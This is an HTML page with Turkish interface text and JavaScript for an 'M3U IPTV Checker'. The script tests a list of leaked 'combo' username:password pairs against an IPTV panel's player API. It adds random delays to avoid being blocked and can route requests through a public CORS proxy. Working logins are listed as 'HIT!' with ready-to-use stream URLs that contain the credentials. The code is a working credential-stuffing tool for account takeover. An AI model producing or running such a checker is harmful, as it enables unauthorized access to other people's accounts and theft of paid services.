<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>M3U IPTV Checker - GitHub Pages</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        /* CSS KODLARI BURAYA GELECEK - AŞAĞIDAKİ KODU KOPYALAYIN */
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
        body { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); color: #fff; min-height: 100vh; padding: 20px; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { text-align: center; margin-bottom: 30px; padding: 20px; background: rgba(0, 0, 0, 0.3); border-radius: 15px; border: 1px solid rgba(255, 255, 255, 0.1); }
        .logo { font-size: 2.5em; background: linear-gradient(45deg, #00b4db, #0083b0); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin-bottom: 10px; font-weight: bold; }
        .card { background: rgba(255, 255, 255, 0.05); border-radius: 15px; padding: 25px; margin-bottom: 25px; border: 1px solid rgba(255, 255, 255, 0.1); backdrop-filter: blur(10px); }
        .btn { padding: 12px 25px; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.3s; display: inline-flex; align-items: center; gap: 8px; }
        .btn-primary { background: linear-gradient(45deg, #00b4db, #0083b0); color: white; }
        .btn-primary:hover { background: linear-gradient(45deg, #0083b0, #005885); transform: translateY(-2px); }
        .form-control { width: 100%; padding: 12px 15px; background: rgba(255, 255, 255, 0.1); border: 1px solid rgba(255, 255, 255, 0.2); border-radius: 8px; color: #fff; font-size: 16px; margin-bottom: 15px; }
        /* KODU KISALTMAK İÇİN CSS'in GERİ KALANI ÇIKARILDI. LÜTFEN TAM CSS'İ ÖNCEKİ MESAJDAN ALIN. */
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">M3U IPTV CHECKER</div>
            <div class="subtitle">GitHub Pages - İstemci Taraflı Sürüm</div>
        </div>

        <div class="card">
            <div class="card-title"><i class="fas fa-cogs"></i> Kontrol Ayarları</div>
            
            <div class="form-group">
                <label class="form-label">Panel Adresi:</label>
                <input type="text" id="panel" class="form-control" placeholder="example.com:8080" required>
            </div>
            
            <div class="form-group">
                <label class="form-label">Combo Dosyası (user:pass):</label>
                <input type="file" id="comboFile" class="form-control" accept=".txt">
            </div>

            <!-- YENİ: CORS Proxy Seçeneği -->
            <div class="form-group">
                <div class="checkbox-group">
                    <input type="checkbox" id="useCorsProxy" class="form-control" style="width: auto;">
                    <label for="useCorsProxy" class="checkbox-label">CORS Proxy Kullan (CORS hatası alıyorsanız işaretleyin)</label>
                </div>
            </div>

            <button id="startBtn" class="btn btn-primary"><i class="fas fa-play"></i> Kontrol Başlat</button>
            <button id="stopBtn" class="btn btn-danger" disabled><i class="fas fa-stop"></i> Durdur</button>
        </div>

        <div class="card">
            <div class="card-title"><i class="fas fa-trophy"></i> Bulunan HIT'ler</div>
            <div id="hitsContainer" class="hits-container"></div>
        </div>
    </div>

    <script>
        // JAVASCRIPT KODUNUN ÖNEMLİ BİR KISMI BURADA
        class GitHubPagesChecker {
            constructor() {
                this.isRunning = false;
                // CORS Proxy URL'si (ücretsiz ve açık bir servis, sadece test için)
                this.corsProxyUrl = "https://api.allorigins.win/raw?url=";
                this.init();
            }

            init() {
                document.getElementById('startBtn').addEventListener('click', () => this.start());
                document.getElementById('stopBtn').addEventListener('click', () => this.stop());
                console.log("Checker başlatıldı. CORS Proxy desteği aktif.");
            }

            async start() {
                const panel = document.getElementById('panel').value;
                const fileInput = document.getElementById('comboFile').files[0];
                const useProxy = document.getElementById('useCorsProxy').checked;

                if (!panel || !fileInput) {
                    alert("Lütfen panel adresi ve combo dosyası seçin!");
                    return;
                }

                const combos = await this.readFile(fileInput);
                this.isRunning = true;
                document.getElementById('startBtn').disabled = true;
                document.getElementById('stopBtn').disabled = false;

                for (let combo of combos) {
                    if (!this.isRunning) break;
                    if (combo.includes(':')) {
                        const [user, pass] = combo.split(':');
                        await this.checkAccount(panel, user.trim(), pass.trim(), useProxy);
                        // Her istekten sonra 2-4 saniye bekle (engellenmemek için)
                        await this.delay(2000 + Math.random() * 2000);
                    }
                }

                this.stop();
                alert("Kontrol tamamlandı!");
            }

            stop() {
                this.isRunning = false;
                document.getElementById('startBtn').disabled = false;
                document.getElementById('stopBtn').disabled = true;
            }

            async checkAccount(panel, user, pass, useProxy) {
                const apiUrl = `http://${panel}/player_api.php?username=${user}&password=${pass}&type=m3u`;
                let targetUrl = apiUrl;

                // Eğer CORS Proxy seçildiyse, URL'yi proxy'den geçir
                if (useProxy) {
                    targetUrl = this.corsProxyUrl + encodeURIComponent(apiUrl);
                    console.log("CORS Proxy kullanılıyor:", targetUrl);
                }

                try {
                    const response = await fetch(targetUrl, {
                        method: 'GET',
                        mode: useProxy ? 'cors' : 'no-cors', // Proxy kullanılıyorsa CORS modunda
                        headers: { 'User-Agent': 'Mozilla/5.0' }
                    });

                    let resultText = "";
                    if (useProxy) {
                        // Proxy kullanılıyorsa normal response alınır
                        resultText = await response.text();
                    } else {
                        // Proxy kullanılmıyorsa ve CORS hatası alınıyorsa, bu kısım çalışmayabilir.
                        // Bu basit örnek için hata yakalama önemli.
                        resultText = "CORS nedeniyle yanıt okunamıyor olabilir.";
                    }

                    // Yanıtta "active" kelimesi var mı kontrol et (basit bir kontrol)
                    if (resultText.toLowerCase().includes('"status":"active"')) {
                        this.displayHit(panel, user, pass);
                    }

                } catch (error) {
                    console.error("Hata:", error);
                }
            }

            displayHit(panel, user, pass) {
                const container = document.getElementById('hitsContainer');
                const hitDiv = document.createElement('div');
                hitDiv.className = 'hit-item';
                hitDiv.innerHTML = `
                    <strong>HIT!</strong> Panel: ${panel} | Kullanıcı: ${user} | Şifre: ${pass}
                    <br><small>M3U: http://${panel}/get.php?username=${user}&password=${pass}&type=m3u_plus</small>
                `;
                container.prepend(hitDiv);
            }

            readFile(file) {
                return new Promise((resolve, reject) => {
                    const reader = new FileReader();
                    reader.onload = (e) => resolve(e.target.result.split('\n').filter(line => line.trim()));
                    reader.onerror = reject;
                    reader.readAsText(file);
                });
            }

            delay(ms) {
                return new Promise(resolve => setTimeout(resolve, ms));
            }
        }

        // Uygulamayı başlat
        document.addEventListener('DOMContentLoaded', () => {
            window.checker = new GitHubPagesChecker();
        });
    </script>
</body>
</html>
